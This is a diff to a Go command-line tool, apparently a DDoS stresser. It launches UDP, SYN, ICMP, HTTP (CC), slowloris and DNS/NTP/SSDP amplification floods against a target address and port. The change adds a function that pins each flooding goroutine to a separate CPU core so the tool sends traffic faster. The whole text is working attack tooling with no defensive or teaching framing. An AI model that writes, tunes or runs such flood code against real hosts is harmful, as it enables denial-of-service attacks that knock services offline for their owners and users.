@@ -539,6 +539,22 @@ func buildDNSQuery() []byte {
 }
 
 // ==================== main ====================
+
+
+// setCPUAffinity 把当前线程绑定到指定 CPU（需要 root，失败静默跳过）
+func setCPUAffinity(cpu int) bool {
+	runtime.LockOSThread()
+	var mask [16]byte
+	mask[cpu/8] |= 1 << (cpu % 8)
+	_, _, errno := syscall.Syscall(syscall.SYS_SCHED_SETAFFINITY,
+		uintptr(syscall.Gettid()), uintptr(len(mask)), uintptr(unsafe.Pointer(&mask[0])))
+	if errno == 0 {
+		return true
+	}
+	return false
+}
+
+
 func main() {
 	target := flag.String("target", "", "目标 IP/域名")
 	port := flag.Int("port", 80, "目标端口")
@@ -582,35 +598,52 @@ func main() {
 
 	switch *mode {
 	case "udp":
-		// 批量发送模式（高pps）
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go udpSendmmsg(*target, *port, perCore, *packet, dur, stopCh, &wg)
+			go func(cpu int) {
+				setCPUAffinity(cpu)
+				udpSendmmsg(*target, *port, perCore, *packet, dur, stopCh, &wg)
+			}(i)
 		}
 	case "tcp", "syn":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go tcpSynFlood(*target, *port, perCore, dur, stopCh, &wg)
+			go func(cpu int) {
+				setCPUAffinity(cpu)
+				tcpSynFlood(*target, *port, perCore, dur, stopCh, &wg)
+			}(i)
 		}
 	case "icmp":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go icmpFlood(*target, perCore, dur, stopCh, &wg)
+			go func(cpu int) {
+				setCPUAffinity(cpu)
+				icmpFlood(*target, perCore, dur, stopCh, &wg)
+			}(i)
 		}
 	case "http", "cc":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go httpFlood(*target, *port, perCore, *path, dur, stopCh, &wg)
+			go func(cpu int) {
+				setCPUAffinity(cpu)
+				httpFlood(*target, *port, perCore, *path, dur, stopCh, &wg)
+			}(i)
 		}
 	case "slowloris":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go slowloris(*target, *port, perCore, dur, stopCh, &wg)
+			go func(cpu int) {
+				setCPUAffinity(cpu)
+				slowloris(*target, *port, perCore, dur, stopCh, &wg)
+			}(i)
 		}
 	case "dns", "ntp", "ssdp":
 		for i := 0; i < cores; i++ {
 			wg.Add(1)
-			go ampFlood(*target, *port, *mode, perCore, dur, stopCh, &wg)
+			go func(cpu int) {
+				setCPUAffinity(cpu)
+				ampFlood(*target, *port, *mode, perCore, dur, stopCh, &wg)
+			}(i)
 		}
 	default:
 		fmt.Println("未知模式:", *mode)
